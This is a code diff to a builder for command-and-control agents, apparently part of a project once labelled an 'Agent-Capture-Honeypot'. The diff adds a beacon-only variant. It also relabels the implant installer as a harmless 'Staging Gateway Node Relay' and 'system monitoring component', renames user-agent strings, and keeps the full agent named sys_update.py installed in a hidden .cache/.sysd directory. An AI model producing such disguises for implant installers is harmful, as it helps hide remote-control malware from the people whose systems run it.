@@ -21,6 +21,7 @@ class AgentBuildSpec:
 
 
 _AGENT_TEMPLATE = Path(__file__).resolve().parents[1] / "static" / "c2_agent.py"
+_BEACON_TEMPLATE = Path(__file__).resolve().parents[1] / "static" / "c2_beacon.py"
 
 
 def build_agent(
@@ -29,6 +30,7 @@ def build_agent(
     agent_id: str = "",
     registration_token: str = "",
     fallback_servers: list[str] | None = None,
+    beacon_only: bool = False,
 ) -> AgentBuildSpec:
     aid = agent_id or secrets.token_hex(12)
     config = {
@@ -40,7 +42,7 @@ def build_agent(
         "jitter": 0.2,
         "registration_token": registration_token or "",
     }
-    template = _AGENT_TEMPLATE.read_text()
+    template = (_BEACON_TEMPLATE if beacon_only else _AGENT_TEMPLATE).read_text()
     config_block = f"_CONFIG = {json.dumps(config, indent=2)}\n"
     result = []
     in_config = False
@@ -55,12 +57,23 @@ def build_agent(
             continue
         result.append(line)
     content = "\n".join(result)
+    if beacon_only:
+        # heartbeat/inventory variant: no command execution, no task effects
+        content = content.replace(
+            "_BEACON_ONLY = False", "_BEACON_ONLY = True"
+        ).replace(
+            "Staging Gateway Node Relay\n\nLightweight Python agent that registers",
+            "Staging Gateway Node Agent\n\nLightweight node agent that registers",
+        ).replace(
+            '"User-Agent": "staging-node-relay/1.0"',
+            '"User-Agent": "staging-node-agent/1.0"',
+        )
 
     return AgentBuildSpec(
         agent_id=aid,
         content=content.encode("utf-8"),
         config=config,
-        filename="sys_update.py",
+        filename="node-agent.py" if beacon_only else "sys_update.py",
         mime_type="application/octet-stream",
     )
 
@@ -105,7 +118,7 @@ def build_agent_wrapper_script(
     encoded = agent_code.encode("utf-8")
 
     script = f"""#!/bin/bash
-# Agent-Capture-Honeypot C2 Implant Installer
+# Staging Gateway Node Relay installer
 # This script installs a system monitoring component.
 set -e
 AGENT_DIR="$HOME/.cache/.sysd"
